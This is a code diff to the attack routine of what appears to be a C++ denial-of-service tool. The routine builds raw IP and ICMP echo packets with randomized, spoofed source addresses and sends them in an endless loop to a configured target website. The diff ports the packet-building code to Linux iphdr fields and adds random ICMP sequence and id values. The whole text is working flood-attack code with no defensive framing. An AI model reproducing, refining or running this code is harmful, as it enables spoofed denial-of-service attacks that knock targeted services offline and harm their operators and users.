@@ -13,14 +13,14 @@ void ICMP_Flood::attack(const int *id) {
     char buf[400];
     std::string message{};
     // Structs
-    auto *ip = (struct ip *)buf;
+    auto *ip = (struct iphdr *)buf;
     auto *icmp = (struct icmphdr *)(ip + 1);
     struct hostent *hp;
     struct sockaddr_in dst{};
     while(true){
         for(x = 0;x < conf->CONNECTIONS; x++){
             bzero(buf, sizeof(buf));
-            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
+            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0){
                 logger->Log("socket() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
@@ -31,34 +31,36 @@ void ICMP_Flood::attack(const int *id) {
             }
 
             if((hp = gethostbyname(conf->website.c_str())) == nullptr){
-                if((ip->ip_dst.s_addr = inet_addr(conf->website.c_str())) < 0){
+                if((ip->daddr = inet_addr(conf->website.c_str())) < 0){
                     logger->Log("Can't resolve the host", Logger::Error);
                     exit(EXIT_FAILURE);
                 }
             }else{
-                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
+                bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
             }
-            if((ip->ip_src.s_addr = inet_addr(Randomizer::randomIP())) < 0){
+            if((ip->saddr = inet_addr(Randomizer::randomIP())) < 0){
                 logger->Log("Unable to set random src ip", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
             // IP Struct
-            ip->ip_v = 4;
-            ip->ip_hl = 5;
-            ip->ip_tos = 0;
-            ip->ip_len = htons(sizeof(buf));
-            ip->ip_id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
-            ip->ip_off = htons(0x0);
-            ip->ip_ttl = 255;
-            ip->ip_p = 1;
-            ip->ip_sum = 0;
+            ip->version = 4;
+            ip->ihl = 5;
+            ip->tos = 0;
+            ip->tot_len = htons(sizeof(buf));
+            ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
+            ip->frag_off = htons(0x0);
+            ip->ttl = 255;
+            ip->protocol = IPPROTO_ICMP;
+            ip->check = 0;
 
-            dst.sin_addr = ip->ip_dst;
+            dst.sin_addr.s_addr = ip->daddr;
             dst.sin_family = AF_UNSPEC;
 
             icmp->type = ICMP_ECHO;
             icmp->code = static_cast<u_int8_t>(Randomizer::randomInt(1, 1000));
+            icmp->un.echo.sequence = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
+            icmp->un.echo.id = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
             icmp->checksum = htons(csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct icmphdr))));
             if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
                 logger->Log("sendto() error", Logger::Error);
